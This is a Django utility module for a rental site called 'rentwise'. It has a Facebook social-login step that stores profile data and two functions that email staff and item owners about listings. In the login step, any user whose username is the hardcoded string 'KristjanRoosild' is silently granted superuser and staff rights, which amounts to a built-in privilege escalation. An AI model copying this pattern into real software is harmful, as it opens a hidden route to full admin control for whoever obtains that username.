from django.contrib.auth.models import User
from django.core.mail import send_mail
from django.template import Context
from django.template.loader import get_template
from django.urls import reverse

from rentwise.settings import DEFAULT_FROM_EMAIL


def save_profile(backend, user, response, *args, **kwargs):
    if backend.name != 'facebook' or user.profile.facebook_id:
        return

    facebook_id = response.get('id')
    picture_url = response['picture']['data'].get('url') if response.get('picture') and response['picture'].get(
        'data') else None
    profile = user.profile
    profile.facebook_id = facebook_id
    profile.picture_url = picture_url
    profile.save()

    if user.username != 'KristjanRoosild':
        return

    user.is_superuser = True
    user.is_staff = True
    user.is_active = True
    user.save()


def send_emails(request, item):
    item_details_url = request.build_absolute_uri(reverse('view_item', args=(item.id,)))
    context = dict(url=item_details_url)
    message = get_template('review_item_email.html').render(Context(context))
    staff_emails = [user.email for user in User.objects.filter(is_staff=True)]
    send_mail('Item Added', message, DEFAULT_FROM_EMAIL, staff_emails, html_message=message)


def send_item_published_email_to_owner(request, item):
    item_details_url = request.build_absolute_uri(reverse('view_item', args=(item.id,)))
    context = dict(url=item_details_url)
    message = get_template('item_published.html').render(Context(context))
    send_mail('Item Published', message, DEFAULT_FROM_EMAIL, [item.user.email], html_message=message)
